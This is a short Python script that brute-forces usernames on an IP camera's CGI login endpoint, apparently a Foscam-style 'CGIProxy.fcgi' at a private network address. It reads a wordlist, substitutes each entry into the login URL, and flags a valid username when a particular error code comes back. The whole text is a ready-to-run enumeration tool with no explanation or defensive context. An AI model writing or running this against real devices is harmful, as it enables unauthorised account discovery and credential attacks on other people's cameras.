import requests
import sys

login_url = "http://192.168.178.122:88/cgi-bin/CGIProxy.fcgi?cmd=logIn&usrName=^USER^&remoteIp=192.168.178.122&groupId=673982479&pwd=&usr=^USER^&pwd="


def load_word_list(fileName):
	with open(fileName) as f:
		lineList = f.readlines()
		lineList = [line.rstrip('\n') for line in open(fileName)]
	return lineList

def parse_url(url, username):
	num_to_change = url.count("^USER^")

	if num_to_change > 0:
		output = url.replace("^USER^", username)
		return output	

def bruteforce(url, word_list):
	username_list = []

	for word in word_list:
		print("Trying username: " + word)
		target = parse_url(url, word)

		result = requests.get(target).text
		if "<logInResult>-5</logInResult>" in result:
			print("username found: " + word)
			username_list.append(word)

	return username_list

def main():
	word_list = load_word_list(sys.argv[1])
	usernames = bruteforce(login_url, word_list)
	

	print(usernames)

	return None


if __name__ == '__main__':
	main()